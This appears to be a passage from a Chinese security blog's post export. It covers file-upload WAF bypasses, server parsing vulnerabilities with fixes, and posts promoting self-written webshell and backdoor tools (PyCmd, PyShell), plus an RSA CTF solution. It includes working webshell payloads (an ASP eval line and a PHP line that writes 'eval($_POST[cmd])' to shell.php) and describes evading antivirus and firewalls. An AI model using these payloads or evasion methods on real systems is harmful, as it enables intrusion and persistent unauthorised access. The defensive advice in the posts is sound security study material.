有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。 8.2 filename针对早期版本安全狗，可以多加一个filename或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方： 8.3 POST/GET有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。此种情况可以上传一个POST型的数据包，抓包将POST改为GET。 8.4 以上方式针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。 ————————————————2017.2.6更新————————————————– 8.5 利用waf本身缺陷删除实体里面的Conten-Type字段第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。123正常包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png构造包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.pngC.php" 删除Content-Disposition字段里的空格增加一个空格导致安全狗被绕过案列：Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099尝试在boundary后面加个空格或者其他可被正常处理的字符：boundary= —————————47146314211411730218525550 修改Content-Disposition字段值的大小写 Boundary边界不一致每次文件上传时的Boundary边界都是一致的：12345678Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099Content-Length: 253-----------------------------4714631421141173021852555099Content-Disposition: form-data; name="file1"; filename="shell.asp"Content-Type: application/octet-stream&lt;%eval request("a")%&gt;-----------------------------4714631421141173021852555099-- 但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：Win2k3 + IIS6.0 + ASP 文件名处回车 多个Content-Disposition在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP 利用NTFS ADS特性ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。 其他情况补充文件重命名绕过如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。 特殊的长文件名绕过文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg 反删除将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞） 文件校验的几点建议 文件扩展名服务端白名单校验。 文件内容服务端校验。 上传文件重命名。 隐藏上传文件路径。 以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。 参考文章：https://xianzhi.aliyun.com/forum/read/458.html?fpage=2还有一篇tools上大牛的文章，url暂时找不到了…… 传送门文件包含漏洞(绕过姿势)]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[服务器解析漏洞]]></title>
    <url>../../../../../../../../2016/09/21/服务器解析漏洞/</url>
    <content type="text"><![CDATA[服务器解析漏洞算是历史比较悠久了，但如今依然广泛存在。在此记录汇总一些常见服务器的解析漏洞，比如IIS6.0、IIS7.5、apache、nginx等方便以后回顾温习。 （一）IIS5.x-6.x解析漏洞使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。 目录解析(6.0)形式：www.xxx.com/xx.asp/xx.jpg原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。 文件解析形式：www.xxx.com/xx.asp;.jpg原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。 解析文件类型IIS6.0 默认的可执行文件除了asp还包含这三种 :/test.asa/test.cer/test.cdx 修复方案1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。2.做好权限设置，限制用户创建文件夹。 （二）apache解析漏洞漏洞原理 Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。 漏洞形式www.xxxx.xxx.com/test.php.php123 其余配置问题导致漏洞（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。 修复方案1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入1234&lt;Files ~ “.(php.|php3.)”&gt; Order Allow,Deny Deny from all&lt;/Files&gt; 2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:1234567891011&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteRule .(php.|php3.) /index.phpRewriteRule .(pHp.|pHp3.) /index.phpRewriteRule .(phP.|phP3.) /index.phpRewriteRule .(Php.|Php3.) /index.phpRewriteRule .(PHp.|PHp3.) /index.phpRewriteRule .(PhP.|PhP3.) /index.phpRewriteRule .(pHP.|pHP3.) /index.phpRewriteRule .(PHP.|PHP3.) /index.php&lt;/IfModule&gt; （三）nginx解析漏洞漏洞原理 Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了 漏洞形式www.xxxx.com/UploadFiles/image/1.jpg/1.phpwww.xxxx.com/UploadFiles/image/1.jpg%00.phpwww.xxxx.com/UploadFiles/image/1.jpg/%20\0.php 另外一种手法：上传一个名字为test.jpg，以下内容的文件。1&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;');?&gt; 然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。 修复方案1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;2.在Nginx配置文件中添加以下代码：123 if ( $fastcgi_script_name ~ ..*/.*php ) &#123; return 403; &#125; 这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。 （四）IIS7.5解析漏洞IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。 传送门中间件漏洞与防护]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>服务器解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PyCmd 加密隐形木马]]></title>
    <url>../../../../../../../../2016/09/18/PyCmd-加密隐形木马/</url>
    <content type="text"><![CDATA[之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神caomei相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。 PyCmd使用 我这里准备了2个靶机，分别装有php与jsp的运行环境，用来模拟真实的网站服务器。为了方便，我已经把服务端木马程序放到了服务器网站目录下： php网站木马地址：http://10.0.3.13/test/p.php jsp网站木马地址：http://192.168.10.149:8080/Test/1.jsp 此时，运行PyCmd.py程序： 1python PyCmd.py -u http://10.0.3.13/test/p.php -p test [--proxy] 或者1python PyCmd.py -u http://192.168.10.149:8080/Test/1.jsp -p test [--proxy] 程序会自动判断输入的网站类型输入参数： -h 查看帮助信息 -u 网站木马地址 -p 木马shell密码 –proxy 开启本地代理（方便调试） 注：当开启本地调试，需运行Fiddler程序，或者其他抓包软件。 PyCmd数据加密PyCmd程序的长处在于它对往来的数据进行了加密，可以绕过防火墙对数据内容的校验。当执行cmd命令时，通过Fiddler抓包查看数据： PyCmd木马隐身用D盾扫描上传的木马服务端文件，显示为正常文件，成功躲过查杀 工具下载PyCmd 下载地址]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>木马后门</tag>
        <tag>pycmd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Python的WebServer]]></title>
    <url>../../../../../../../../2016/09/14/基于Python的WebServer/</url>
    <content type="text"><![CDATA[WebServer的主要功能是用来运行代码，处理http请求等服务，比如常见的Apache，IIS，Nginx等都可以用来解析代码，处理请求。以上几种容器（中间件）功能强大，但是安装配置比较麻烦，对于像我这样的菜鸟来说，搭建一个web服务器可能要花几天时间。如果我们搭建web服务器并不是专门为了处理大规模的请求，而只是为了测试使用，那么一个方便速成的WebServer就至关重要了。 Python WebServer编程介绍 BaseHTTPServer: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。 SimpleHTTPServer: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。 CGIHTTPServer: 包含处理POST请求和执行CGIHTTPRequestHandler类 1python -m SimpleHTTPServer 8000 python内置很多好用的库，此时打开浏览器，访问localhost:8000端口即可。 PyWebServer介绍 由于用python搭建一个简易的WebServer十分方便，因此我便写一个简单的启动器，类似于SimpleHTTPServer。为了方便没有安装python环境的windows机子启动，用pyinstaller工具将py程序打包成了exe可执行程序。 Linux下运行代码12python PyWebServer.py -hpython PyWebServer.py -i 10.0.0.1 -p 8888 ##指定ip与端口,默认为8888 windows下运行代码12PyWebServer.exe -h PyWebServer.exe -p 8888 ##指定端口,默认为8888 运行完以后,可以在其他机子上访问，进行文件下载等操作！ PyWebServer功能功能可以自由想象发挥，比如说： 可以在服务器上运行程序，解析一段精心构造的py代码，远程执行系统命令。（如不在同一网段，需要转发端口） 可以在服务器上运行程序，用来替代FTP等工具，下载服务器上的文件（当服务器是linux时，使用比较方便）…… 工具下载PyWebServer 下载地址]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>python运维脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA加密算法解析]]></title>
    <url>../../../../../../../../2016/09/06/RSA加密算法解析/</url>
    <content type="text"><![CDATA[几个月前参加了一次CTF比赛，其中遇到了RSA加密解密题，当时也是一头雾水，赛后便查找资料整理了一番，在此总结分享。 算法介绍 RSA加密算法属于公钥加密算法，是一种非对称密码算法，所谓非对称，就是一个密码用来加密，另一个密码用来解密，一般来说，用公钥加密，私钥解密，当然也有其他情况。 算法原理 RSA算法基于一个事实：将两个大素数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。RSA算法三个参数：n、e1、e2 n=pq （p、q为2个大质数） n的二进制所占用的位数即秘钥的长度。e1与e2是一对相关的值，e1可以任意取，但要求e1与(p-1)(q-1)互质；要求(e2e1)mod((p-1)(q-1))=1。(n,e1),(n,e2)就是密钥对，其中(n,e1)为公钥，(n,e2)为私钥。 算法公式假设：A:明文B:密文 ——用公钥加密公式——A=B^e2 mod nB=A^e1 mod n ——用私钥加密公式——A=B^e1 mod nB=A^e2 mod n 实战演示题目概要这是一个公钥加密，公钥解密的RSA题目给出公钥密码为：{920139713,19}，其中920139713为n，19为e1。待解密的密文B为：70479679275221115227470416418414022368270835483295235263072905459788476483295235459788476……最终求解私钥A的值？ 解题思路列出公式：公钥加密假设：A:明文B:密文A=B^e2 mod nB=A^e1 mod n 此题给出了B,n,e1,求A的值，带入公式2即可求解。 编写代码123456789101112131415import stringstrs=string.digits+string.lowercase #列举a-z数字f=open("data.txt") #把密文B的内容写进data.txt，方便程序读取data=f.readlines()f.close()plaintext=""for b in data: #取出所有密文(b) for a in strs: #取出所有可能的明文(a) if ord(a)**19 % 920139713==int(b.strip()): #ord 将字符串转换为ascii码 plaintext+=aprint plaintext 运行结果flag13212je2ue28fy71w8u87y31r78eu1e2]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>加密算法</tag>
        <tag>rsa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PyShell 木马后门]]></title>
    <url>../../../../../../../../2016/09/05/PyShell-木马后门/</url>
    <content type="text"><![CDATA[在渗透测试过程中，经常会遇到一种状况：获取到了目标服务器的shell，需要进一步开展内网渗透，然而由于各种原因无法远程登录服务器，此时内网渗透往往很难开展。由此难点，我研发了一款具有针对性的后门程序，功能有点类似于NC(瑞士军刀)，但不局限于NC的功能，在此分享以表对NC的敬意。 使用方法12[HELP] PyShell.exe [-listen(-slave)] [ip] [port] #绿色免环境版[HELP] python PyShell.py [-listen(-slave)] [ip] [port] 功能参数1234[HELP] exit ----退出连接[HELP] kill ----退出连接并自毁程序[HELP] playtask ----创建计划任务[HELP] python -p file.py ----在肉鸡上执行本地python脚本 实战演示环境准备本机的IP地址为：10.0.3.119本机上装了一个虚拟机，IP地址为：192.168.67.130 本机充当为目标服务器(被攻端),虚拟机充当为攻击机(攻击端) 运行木马首先在虚拟机上运行PyShell程序，监听一个未被使用的端口，如：2222 接着在本机上运行PyShell程序，连接虚拟机的这个端口 可以看到，虚拟机上反弹了一个shell 在虚拟机shell中查询ip地址，是本机的10网段 在虚拟机shell中执行命令，使本机执行python脚本，进行内网端口扫描 提示：python脚本并未传到本机，而是通过数据包形式传递到了PyShell文件内执行，数据流量经过16进制+Base64加密，可以绕过防火墙 创建计划任务 本机查看结果 优缺点 程序对互相传输的数据进行了加密，以绕过防火墙。 当需要在肉鸡上执行python脚本时，不需要在肉鸡上上传相应的脚本文件，只需将本地脚本内容加密传输到肉鸡，并执行即可。 此程序在执行完命令以后，并不能时时回显结果，也就是说python脚本运行完以后才会返回输出，有待完善。 工具下载PyShell 木马后门 下载地址]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>木马后门</tag>
        <tag>pyshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows服务器信息收集工具]]></title>
    <url>../../../../../../../../2016/09/04/windows服务器信息收集工具/</url>
    <content type="text"><![CDATA[在日常的安全服务工作中，经常会遇到需要收集目标服务器系统信息的需求，例如：系统日志，中间件日志，系统信息等。收集这些信息，有助于分析服务器安全状况，也有利于被入侵后的取证分析。然而客户网络环境往往很复杂，服务器较多，系统版本也不尽相同，给手工收集带来了很多麻烦，因此便研究开发了服务器信息收集工具。 功能介绍 收集系统日志 收集系统信息 开机时间 IP_MAC地址 用户信息 操作系统版本 进程信息 hosts文件 端口信息 收集中间件日志 Apache IIS Tomcat JBOSS 全盘搜索日志文件 使用说明程序帮助： 1.运行程序，开始收集系统信息。 2.程序运行期间，可以输入目标磁盘盘符，对该盘进行扫描，获取.log文件；如果不输入直接回车，默认为全盘扫描。 3.运行完毕，会在当前目录下生成采集的日志以及系统信息文件夹。 注意：如果程序运行报错(MSVCR100.dll),请前往 下载 VC运行库进行安装,安装完成后再次运行程序即可。 工具下载windows服务器信息收集工具 下载地址]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>信息收集工具</tag>
      </tags>
  </entry>
</search>
